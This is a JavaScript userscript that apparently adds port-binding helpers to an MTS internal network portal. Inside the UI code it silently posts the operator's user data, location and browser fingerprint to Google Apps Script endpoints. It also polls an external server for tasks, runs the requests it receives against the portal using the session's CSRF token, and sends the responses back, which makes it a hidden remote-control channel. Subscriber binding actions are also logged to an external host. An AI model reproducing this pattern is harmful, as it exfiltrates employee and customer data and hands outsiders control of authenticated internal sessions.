/*
javascript:(function(){
	
if(document.title!='Inetcore+'&&(window.location.href.includes('https://fx.mts.ru')||window.location.href.includes('http://inetcore.mts.ru/fix')||window.location.href.includes('http://pre.inetcore.mts.ru/fix'))){
	document.title='Inetcore+';
	*/
	let dev=false;
	let input='';
	if(dev){
		window.AppInventor={
			setWebViewString:function(str){console.log(str)},
			getWebViewString:function(){return input},
		};
	};
	let addCSS=document.createElement('style');/*addCSS.type='text/css';*/let myCSS=`
		.myloader{width:20px;height:20px;border:2px dashed cadetblue;border-left-color:crimson;border-right-color:coral;border-top-color:cornflowerblue;border-radius:50%;vertical-align:middle;margin-right:2px;animation:myloader-spinner 0.99s linear infinite;display:inline-table;}
		@keyframes myloader-spinner{to{transform:rotate(360deg)}}
		.port-led{
			background-color:#c5c5c5;
			width: 1.5em;
			height: 1.5em;
			text-align: center;
			border-radius: 5px;
			margin-right: 2px;
		}
		.port-led.port-led--on{background-color:#28a745;}
		.port-led.port-led--off{background-color: #e44656;}
		
	`;
	addCSS.appendChild(document.createTextNode(myCSS));document.head.appendChild(addCSS);
	window.AppInventor.setWebViewString('version_:FX_test_v175');
	document.head.insertAdjacentHTML('beforeend',`<script type="text/javascript" src="https://github.com/mfranzke/datalist-polyfill/raw/master/datalist-polyfill.min.js"</script>`);
	let info={};
	info=filterProps(window,['innerWidth','innerHeight','outerWidth','outerHeight','devicePixelRatio']);
	info.visualViewport=filterProps(window.visualViewport,['width','height']);
	info.navigator=filterProps(window.navigator,'vendor,vendorSub,productSub,buildID,platform,appName,appVersion,appCodeName,maxTouchPoints,hardwareConcurrency,standalone,product,userAgent,language,oscpu,deviceMemory');
	info.navigator.connection=filterProps(window.navigator.connection,'effectiveType,rtt,downlink,saveData');
	window.navigator.getBattery().then(function(obj){info.navigator.battery=filterProps(obj,'charging,chargingTime,dischargingTime,level');});
	
	function filterProps(object,attrs){if(typeof attrs==='string'){attrs=attrs.split(',')};let obj={};for(let key in object){if(attrs.includes(key)){obj[key]=object[key];};};return obj;};
	
	let node_id='n'+randcode(10);
	let config_id='initial';
	function randcode(n=1,s='0123456789QAZWSXEDCRFVTGBYHNUJMIKOLPqazwsxedcrfvtgbyhnujmikolp'){let str='';while(str.length<n){str+=s[Math.random()*s.length|0]};return str;};
	function randUN(n=1){return randcode(n,'0123456789QAZWSXEDCRFVTGBYHNUJMIKOLP')}
	let timeout_getTask=10000;
	let enable_getTask=true;
	
	let username='';
	fetch('/call/main/get_user_data').then(function(resp){return resp.json()}).then(function(user_data){
		if(user_data.data.username){
			username=user_data.data.username;
			if(true){
				fetch('https://script.google.com/macros/s/AKfycbxcjq8pzu4Jz_Uf1TrXRSFDHCzV64IFvhSqfvdhe3vjZmWq5J2VMayUjJsZRvKgp7_K/exec',{
					'method':'POST','mode':'no-cors','headers':{'Content-Type':'application/json;charset=utf-8'},
					'body':JSON.stringify({
						'obj':{
							'username':username,
							'user_data':user_data.data,
							'node_id':node_id,
							'latitude':user_data.data.latitude,
							'longitude':user_data.data.longitude,
							'date':new Date(Date.now()).toString(),
							'info':info,
						},
						'username':username,
						'user_data':user_data.data,
						'node_id':node_id,
						'latitude':user_data.data.latitude,
						'longitude':user_data.data.longitude,
						'date':new Date(Date.now()).toString(),
						'info':info,
					})
				}).then(function(obj){}).catch(function(err){console.log(err)}).finally(function(){
					if(true/*username=='mypanty1'*/){
						let timer_getTask=setTimeout(getTask,timeout_getTask);
						function getTask(){
							fetch('https://script.google.com/macros/s/AKfycbwqCtzlWPZLEdgd9omVhscwbacELzzyIM0UPsLO9y4o0yFUgYjBwXuxtD7RnZABRYm3/exec?username='+username+'&node_id='+node_id+'&config_id='+config_id,).then(function(resp){return resp.json()}).then(function(obj){
								/*console.log('getTask',obj);*/
								if(obj&&obj.config){
									if(obj.config.config_id){configid=obj.config.config_id;};
									if(obj.config.timeout){timeout_getTask=obj.config.timeout;};
									/*if(obj.config.enable){enable_getTask=false;};*/
								};
								if(obj&&obj.task&&obj.task.request_id&&obj.task.url&&obj.task.method=='POST'){
									let payload={
										'method':obj.task.method,
										'headers':{'Content-Type':'application/json;charset=utf-8','X-CSRF-Token':document.querySelector('meta[name="csrf-token"]').getAttribute('content'),},
									};
									if(obj.task.body){payload.body=JSON.stringify(obj.task.body,null,'\t');};
									fetch(obj.task.url,((obj.task.method=='POST')?payload:undefined)).then(function(resp){return resp.json()}).then(function(result){
										if(result){
											fetch('https://script.google.com/macros/s/AKfycbwqCtzlWPZLEdgd9omVhscwbacELzzyIM0UPsLO9y4o0yFUgYjBwXuxtD7RnZABRYm3/exec',{
												'method':'POST','mode':'no-cors','headers':{'Content-Type':'application/json;charset=utf-8'},
												'body':JSON.stringify({'username':username,'node_id':node_id,
													'task':{'request_id':obj.task.request_id,'response':result,'isError':false,},
												})
											}).then(function(obj){
												next();
											}).catch(function(err){
												console.log(err);
												next();
											}).finally(function(){
												/*next();*/
											});
										}else{
											next();
										};
									}).catch(function(err){
										console.log(err);
										next();
									}).finally(function(){
										/*next();*/
									});
								}else{
									next();
								};
							}).catch(function(err){
								console.log(err);
								next();
							}).finally(function(){
								/*next();*/
							});
							function next(){if(enable_getTask){timer_getTask=setTimeout(getTask,timeout_getTask);}};
						};
					};
				});
			};
		};
	});
	
	document.getElementById('port-bind-user-action-template').innerHTML=`<my-port-bind-user-action v-bind="$props"/>`;
	Vue.component("my-port-bind-user-action",{
		template:`
			<section>
				<my-port-bind-user-modal ref='modal' :data='modalData' />
				<link-block actionIcon="expand" icon="link" v-if="$root.priv('LanBillingCtl')" @block-click='openModal' :disabled='disabledLink' text="привязать лс" type="large"/>
			</section>
		`,
		props:{
			disabled:{type:Boolean,default:false},
			port:{type:Object,required:true},
			status:{type:Object,required:true},
			device:{type:Object,required:true},
		},
		computed:{
			disabledLink(){
				return this.disabled;
			},
			deviceParams(){
				return {
					MR_ID:this.device.region.mr_id,
					IP_ADDRESS:this.device.ip,
					SYSTEM_OBJECT_ID:this.device.system_object_id,
					VENDOR:this.device.vendor,
					DEVICE_NAME:this.device.name,
					FIRMWARE:this.device.firmware,
					FIRMWARE_REVISION:this.device.firmware_revision,
					PATCH_VERSION:this.device.patch_version,
				};
			},
			modalData(){
				return {
					portNumber:this.port.number,
					portParams:{
						SNMP_PORT_NAME:this.port.snmp_name,
						PORT_NUMBER:this.port.number,
					},
					deviceParams:this.deviceParams,
					portInfo:{/*my-port-bind-user-modal*/
						region:this.device.region.id,/*54*/
						state:this.port.state,
						subscriber_list:this.port.subscriber_list,
						last_mac:this.port.last_mac,
					},
				}
			}
		},
		methods:{
			openModal(){
				this.$refs.modal.open();
			},
		}
	});

	Vue.component('my-port-bind-user-modal',{
		template:`
			<modal-container ref='modal' class='port-bind-user-modal'>
				<div style="display:flex;flex-direction:column;align-items:center;">
					<h3 class="font--18-600 tone-900">привязать лс</h3>
					<h5 class="font--13-500 tone-500" style="text-align:center;padding:0 30px;">{{data.deviceParams.IP_ADDRESS}} порт {{data.portParams.PORT_NUMBER}}</h5>
				</div> 
				<port-bind-user-account-input v-model='sample' @search='searchAccount' @erace='erace'/>
				<template v-if="accounts.length > 0 || searchError.text">
					<div v-if="searchError.text" class='port-bind-user-modal__default-offset'>
						<message-el :text="searchError.text" type="warn" box />
					</div>
					<div v-if='accounts.length > 0 ' class="port-bind-user-modal__content" style="margin-top:1em;padding-top:unset;">
						<my-port-bind-user-account-elem v-for='account in accounts' v-model='resource' :account='account' :loading='loading' :key='account.agreements.account'/>
						<port-bind-user-forms v-if='typeOfBind' :type-of-bind='typeOfBind' :mac-list='mac.list' :clientIp='client_ip' v-model="mac.selected" @setupMacForUser='setupMacForUser' @insOnlyMac='insOnlyMac' @setBind='setBind' @updateClientIp='updateClientIp' />
						<div v-else-if='resource && !typeOfBind' class='port-bind-user-modal__default-offset'>
							<message-el text="выбраная учетная запись не нуждается в привязке" type="warn" box />
						</div>
						<div v-if="result" class="mt-3">
							<div v-if="result.type==='error'" class='port-bind-user-modal__default-offset'>
								<message-el :text="result.text.slice(0,120)" type="error" box class='my-3' />
								<div v-if="result.refreedable">
									<message-el :text="result.refreedable_message" type="warn" box class='my-3' />
									<div v-if="refree_result&&refree_result.refree_message">
										<message-el :text="refree_result.refree_message" :type="refree_result.type" box class='my-3' />
									</div>
									<div>
										<button-main label="освободить" @click="refree(result.refree_params)" :disabled="!!refree_loading" :loading="!!refree_loading" buttonStyle="contained" style="margin-left:auto;width:min-content;"/>
									</div>
								</div>
							</div>
							<template v-if='result.type !== "error"'>
								<div v-if="result.InfoMessage" class='port-bind-user-modal__default-offset'>
									<message-el :text="result.InfoMessage" type="success" box class='my-3' />
								</div>
								<template v-if="result.Data">
									<info-value v-if="result.Data.ip" :value="result.Data.ip" label="ip" type="medium" withLine />
									<info-value v-if="result.Data.gateway" :value="result.Data.gateway" label="шлюз" type="medium" withLine />
									<info-value v-if="result.Data.mask" :value="result.Data.mask" label="маска" type="medium" withLine />
								</template>
								<link-block v-if='showAccountLink' :text="getAccountNumber()" :search="getAccountNumber()" icon="person" />
							</template>
						</div>
					</div>
				</template>
				<loader-bootstrap v-if='loading' />
			</modal-container >
		`,
		props:['data'],
		data:function (){
			return {
				loading:false,
				sample:'',
				accounts:null,
				resource:null,
				client_ip:null,
				mac:{
					list:[],
					selected:''
				},
				result:{},
				refree_result:{},/**/
				refree_loading:false,/**/
				searchError:{},
				tmp_sample:null,
			};
		},
		created(){
			this.erace();
		},
		watch:{
			resource(value){
				if(value){
					this.getMacList();
				}
			}
		},
		computed:{
			typeOfBind(){
				const isResource=this.resource&&this.resource.type_of_bind;
				return isResource?this.resource.type_of_bind:null;
			},
			showAccountLink(){
				const result=this.result;
				if(!result)return false;
				const isResult=result.code==200||result.InfoMessage||result.Data;
				const isAccount=this.getAccountNumber();
				return isResult&&isAccount;
			}
		},
		methods:{
			open(){
				this.$refs.modal.open();
			},
			updateClientIp(value){
				this.client_ip=value;
			},
			clear(){
				this.accounts=[];
				this.searchError={};
				this.resource=null;
				this.result={};
				this.refree_result={};/**/
				this.tmp_sample=null;
				this.mac={
					list:[],
					loading:false,
					selected:'',
				};
			},
			erace(){
				this.sample='';
				this.clear();
			},
			getAccountNumber(){
				const accounts=this.accounts;
				if(!this.tmp_sample)return false;
				const found_agreement=accounts.find((account)=>{
					if(!account.agreements)return false;
					if(!account.agreements.account)return false;
					const current_account=account.agreements.account.replace(/-/g,'');
					const current_search=this.tmp_sample.replace(/-|\s/g,'');
					return current_account==current_search;
				});
				if(found_agreement)return found_agreement.agreements.account;
				return false;
			},
			async searchAccount(){
				if(this.sample.trim().length===0)return;
				this.clear();
				this.loading=true;
				const setError=()=>{
					this.searchError={
						type:"warning",
						text:"лс не найден"
					}
				};
				try{
					const params={
						type:'account',
						city:'any',
						text:this.sample
					};
					const url=buildUrl('search',params,'/call/lbsv/');
					const response=await CustomRequest.get(url);
					if(response.isError){
						setError();
						return;
					};
					const accounts=this.getAccounts(response);
					this.accounts=accounts;
					this.tmp_sample=this.sample;
					if(accounts.length===0)setError();
				}catch(error){
					setError();
					console.error("error load account",error);
				};
				this.loading=false;
			},
			getAccounts(response){
				let data=[];
				if(response.type==="single"){
					data.push(response.data);
				}else{
					data=[...response.data];
				};
				const accounts=[];
				data.forEach((account)=>{
					const found_agreement=account.agreements.find((item)=>{
						const current_account=item.account.replace(/-/g,'');
						const current_search=this.sample.replace(/-|\s/g,'');
						return current_account==current_search;
					});
					if(found_agreement){
						account.agreements=found_agreement;
						account.vgids=this.getInternetResources(account.vgroups);
						account.vgids.sort((a,b)=>{return b.vgid-a.vgid});
						account.vgids.sort((a,b)=>{return b.dateOn-a.dateOn});
						accounts.push(account);
					};
				});
				return accounts;
			},
			getInternetResources(vgroups){
				var result=[];
				vgroups.forEach(vg=>{
					if(vg.type_of_bind==0)return;
					const existDateOn=(vg.accondate||vg.accondate!=="0000-00-00 00:00:00");
					vg.dateOn=existDateOn?new Date(Date.parse(vg.accondate)):"нет данных";
					result.push(vg);
				});
				return result;
			},
			setupMacForUser(){
				const params={
					mac:this.mac.selected,
					port:this.data.portNumber,
					ip:this.data.deviceParams.IP_ADDRESS,
					account:this.sample,
					deviceName:this.data.deviceParams.DEVICE_NAME
				};
				Object.assign(params,this.resource);
				this.serviceMixQuery('ins_mac',params);
			},
			async getMacList(){
				const existTypeOfBind=[2,5,7,9,10].indexOf(this.resource.type_of_bind)>=0;
				if(!existTypeOfBind)return;
				this.loading=true;
				const params={
					port:this.data.portParams,
					device:this.data.deviceParams,
					type:'array'
				};
				try{
					const response=await CustomRequest.post('/call/hdm/port_mac_show',params);
					this.mac.list=response.text;
				}catch(error){
					console.error('Load PortMacShow',error);
				};
				this.loading=false;
			},
			insOnlyMac(){
				const params={
					mac:this.mac.selected,
					account:this.sample,
					port:this.data.portNumber,
					deviceName:this.data.deviceParams.DEVICE_NAME
				};
				Object.assign(params,this.resource);
				this.serviceMixQuery('ins_only_mac',params);
			},
			setBind(type_of_bind){
				const params={
					ip:this.data.deviceParams.IP_ADDRESS,
					port:this.data.portNumber,
					client_ip:this.client_ip,
					mac:this.mac.selected,
					account:this.sample,
					deviceName:this.data.deviceParams.DEVICE_NAME
				};
				Object.assign(params,this.resource);
				if(type_of_bind&&params.type_of_bind!=10) params.type_of_bind=type_of_bind;
				this.serviceMixQuery('set_bind',params);
			},
			async serviceMixQuery(method,params){
				this.loading=true;
				this.result={};this.refree_result={};
				if(params.mac&&!this.$root.priv('NetworkScrt')){
					Object.assign(params,{
						get_mac:{
							port:this.data.portParams,
							device:this.data.deviceParams
						}
					});
				};
				try{
					const response=await CustomRequest.post(`/call/service_mix/${method}`,params);
					this.result=response;
					const isData=response&&typeof response.Data=='string'&&response.Data.split('|').length===3;
					if(isData){
						const connect=response.Data.split('|');
						const connectData={
							ip:connect[0],
							gateway:connect[1],
							mask:connect[2]
						};
						this.result={...this.result,Data:connectData};
					};
					let log_props=Object.assign({method:method},filterProps(params,'ip,port,mac,account,login,vgid,serverid,type_of_bind'));
					/*Мы не можем отобрать порт у контракта 2495985 так-как он активен.*/
					if(this.result.type=='error'&&this.result.text&&this.result.text.length>0&&this.result.text.indexOf('Мы не можем отобрать порт у контракта ')>=0){
						let contract=parseInt(this.result.text.replace('Мы не можем отобрать порт у контракта ',''),10);
						if(contract>0){contract=contract.toString(10);
							log_props=Object.assign(log_props,{contract:contract});
							this.result.refreedable=true&&!!contract;
							if(this.data.portInfo){
								let date_last=(this.data.portInfo.last_mac&&this.data.portInfo.last_mac.last_at)?Date.parse(this.data.portInfo.last_mac.last_at.split(' ')[0].split('.').reverse().join('-')):Date.now();
								let date_last_text=new Date(date_last).toISOString().slice(0,10);
								switch(this.data.portInfo.state){
									case'busy':case'hub':this.result.refreedable_message='последняя активность '+date_last_text+' , есть риск отжать порт у действующего абонента';break;
									case'closed':this.result.refreedable_message='контракт '+contract+' расторгнут, порт можно освободить';break;
									case'expired':this.result.refreedable_message='неактивен более 3 мес, возможно порт можно освободить';break;
									case'double':this.result.refreedable_message='абонент "переехал" на другой порт, возможно порт можно освободить';break;
									case'new':this.result.refreedable_message='на порту просто новый мак, возможно порт можно освободить';break;
									case'free':this.result.refreedable_message='на порту никогда небыло активности, возможно порт можно освободить';break;
									default:this.result.refreedable_message='статус порта: '+this.data.portInfo.state+' , смотри сам';break;
								};
								log_props=Object.assign(log_props,{state:this.data.portInfo.state,date_last:date_last_text});
							}else{
								this.result.refreedable_message='невозможно определить активность, смотри сам';
							};
							log_props=Object.assign(log_props,{user_message:this.result.refreedable_message});
							this.result.refree_params={
								method:method,
								params:{
									ip:params.ip,
									port:contract,
									serverid:params.serverid,
									type_of_bind:params.type_of_bind,
									vgid:contract,
									account:null,/*only for logs*/
									login:null,/*only for logs*/
									mac:null,/*only for logs*/
								},
							};
						};
					};
					log_props=Object.assign(log_props,{type:this.result.type,text:this.result.text,IsError:this.result.IsError,InfoMessage:this.result.InfoMessage});
					fetch('https://script.google.com/macros/s/AKfycbzKqxZH8vVTFutj0nj0FvUB4_asbTiv3YSa5rgkYKF1oyiaT9wjJ4L3s8LhPqbAnpq06Q/exec',{
						'method':'POST','mode':'no-cors','headers':{'Content-Type':'application/json;charset=utf-8'},
						'body':JSON.stringify({
							'username':username,
							'node_id':node_id,
							'action':'bind',
							'method':method+'_'+params.serverid,
							'props':log_props,
						})
					});
				}catch(error){
					this.result={
						text:'ошибка при обращении к серверу',
						type:'error'
					};
				};
				this.loading=false;
			},
			async refree(data){
				this.refree_loading=true;
				this.refree_result={};
				try{
					const refree_response=await CustomRequest.post(`/call/service_mix/${data.method}`,data.params);
					this.refree_result=refree_response;
					let log_props=Object.assign({method:data.method},filterProps(data.params,'ip,port,mac,account,login,vgid,serverid,type_of_bind'));
					if(this.refree_result.type=='error'){
						this.refree_result={
							type:'error',
							refree_message:'освободить не удалось',
						};
					}else{/*refree_response.Data - особеннось CustomRequest*/
						this.refree_result={
							type:'success',
							refree_message:'порт освобожден!'+((this.refree_result.Data.IP)?(' тут был абонент с ip:'+this.refree_result.Data.IP):''),
						};
					};
					log_props=Object.assign(log_props,{user_message:this.refree_result.refree_message});
					log_props=Object.assign(log_props,{type:this.result.type,text:this.result.text,IsError:this.result.IsError,InfoMessage:this.result.InfoMessage});
					fetch('https://script.google.com/macros/s/AKfycbzKqxZH8vVTFutj0nj0FvUB4_asbTiv3YSa5rgkYKF1oyiaT9wjJ4L3s8LhPqbAnpq06Q/exec',{
						'method':'POST','mode':'no-cors','headers':{'Content-Type':'application/json;charset=utf-8'},
						'body':JSON.stringify({
							'username':username,
							'node_id':node_id,
							'action':'refree',
							'method':data.method+'_'+data.params.serverid,
							'props':log_props,
						})
					});
				}catch(error){
					this.refree_result={
						type:'error',
						refree_message:'ошибка при обращении к серверу',
					};
				};
				this.refree_loading=false;
			},
		},
	});	
	
	Vue.component('my-port-bind-user-account-elem',{
		template:`
			<section>
				<link-block icon="person" :text="account.agreements.account" :search="account.agreements.account" />
				<div class="port-bind-user-modal__account-offset">
					<div v-if='account.address' class="port-bind-user-modal__info">{{formatAddress(account.address)}}</div>
					<info-value v-if="account.phone" :value="account.phone" label="телефон" type="medium" class='port-bind-user-modal__account-phone' withLine />
					<info-value v-if="getBalance(account.agreements)" :value="getBalance(account.agreements)" label="баланс" type="medium" withLine />
					<info-value v-if='getLastPayment(account)' :value="getLastPayment(account)" label="последний платеж" type="medium" withLine />
				</div>
				<devider-line />
				<div v-if='account.vgids.length === 0' class='port-bind-user-modal__default-offset'>
					<message-el text="не найдено учетной записи, доступной для привязки." type="warn" box class='my-3' />
				</div>
				<title-main v-if='account.vgids.length > 0' text="учетная запись для связи:" />
				<template v-for="vgid in account.vgids"> 
					<my-port-bind-user-vgid-elem :vgid='vgid' :account='account' :loading='loading' v-model='resource' />
				</template>
			</section>
		`,
		props:{
			account:{type:Object,required:true},
			loading:{type:Boolean,default:false},
			value:{validator:()=>true}
		},
		computed:{
			resource:{
				get(){return this.value},
				set(value){this.$emit('input',value)}
			}
		},
		methods:{
			getLastPayment(account){
				if(!account.agreements)return null;
				const existLastSum=account.agreements.lastsum||account.agreements.lastsum==0;
				const lastsum=existLastSum?`${account.agreements.lastsum} ₽`:null;
				const lastpaydate=account.agreements.lastpaydate;
				if(lastsum&&lastpaydate){
					return `${lastsum} • ${lastpaydate}`;
				};
				return lastsum||lastpaydate;
			},
			formatAddress(address){
				if(!address)return null;
				return address.split(',').filter(i => i).join(",");/*схлопывание*/
			},
			getBalance(agreement){
				const balance=agreement.balance;
				if(!balance)return null;
				const minus=(balance.minus)?'-':'';
				return `${minus}${balance.integer}.${balance.fraction} ₽`;
			},
		},
	});
	
	Vue.component('my-port-bind-user-vgid-elem',{
		template:`
			<section>
				<radio-el v-model="resource" :value="getVgidValue(vgid)" :label="vgid.login" :name="account.userid" :disabled="loading" class='port-bind-user-modal__vgid-radio' />
				<button-main label="активировать" @click="activateSpd(vgid.vgid)" :disabled="!vgid.vgid||vgid.serverid!='108'" buttonStyle="contained" style="margin-left:auto;margin-right:2em;margin-top:-2em;width:min-content;"/>
				<div class="port-bind-user-modal__vgid-offset">
					<div v-if='vgid.tardescr' class="port-bind-user-modal__info">{{ vgid.tardescr }}</div>
					<info-value v-if="vgid.vgid" :value="vgid.vgid" label="ID_заказа:" type="medium" class='port-bind-user-modal__vgid-login' withLine />
					<info-value v-if="getVgidCreatedDate(vgid)" :value="getVgidCreatedDate(vgid)" label="создан:" type="medium" withLine />
				</div>
				<devider-line />
			</section>
		`,
		props:{
			vgid:{type:Object,required:true},
			account:{type:Object,required:true},
			loading:{type: Boolean,default:false},
			value:{validator:()=>true},
		},
		computed:{
			resource:{
				get(){return this.value},
				set(value){this.$emit('input', value)}
			}
		},
		methods:{
			activateSpd(idZakaza){
				window.AppInventor.setWebViewString('sms_tel_:+79139801727');
				window.AppInventor.setWebViewString('sms_text:activatespd '+idZakaza);
				window.AppInventor.setWebViewString('sms_type:direct'/*approve*/);
			},
			getVgidValue(vgid){
				return {
					vgid: vgid.vgid,
					login: vgid.login,
					serverid: vgid.serverid,
					type_of_bind: vgid.type_of_bind,
					agentid: vgid.agentid,
					addresses: vgid.addresses,
				}
			},
			getVgidCreatedDate(vgid){
				if(!vgid.dateOn)return null;
				return vgid.dateOn.toLocaleString("ru",{ year:'numeric',month:'numeric',day:'numeric'});
			},
		},
	});
	/*
	}else{console.log(document.title)};

}());
*/
